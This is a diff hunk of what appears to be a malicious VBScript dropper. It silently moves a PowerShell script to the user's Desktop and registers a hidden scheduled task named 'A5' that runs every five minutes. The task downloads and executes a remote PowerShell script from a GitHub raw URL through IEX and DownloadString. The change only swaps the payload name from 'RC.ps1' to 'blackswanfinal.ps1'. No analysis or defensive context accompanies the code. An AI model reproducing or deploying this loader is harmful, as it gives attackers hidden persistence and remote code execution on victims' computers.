@@ -11,5 +11,5 @@ Set sz = CreateObject("WScript.Shell")
 sz.Run ("cmd /c move %tmp%\R1.ps1 %USERPROFILE%\Desktop\R1.ps1"), 0, True
 
 Set sy = CreateObject("WScript.Shell")
-sy.Run ("schtasks /Create /sc minute /mo 5 /tn ""A5"" /tr ""start-process -filepath powershell -windowstyle hidden -argumentlist IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RC.ps1')"" /F"), 0, False
+sy.Run ("schtasks /Create /sc minute /mo 5 /tn ""A5"" /tr ""start-process -filepath powershell -windowstyle hidden -argumentlist IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')"" /F"), 0, False
 
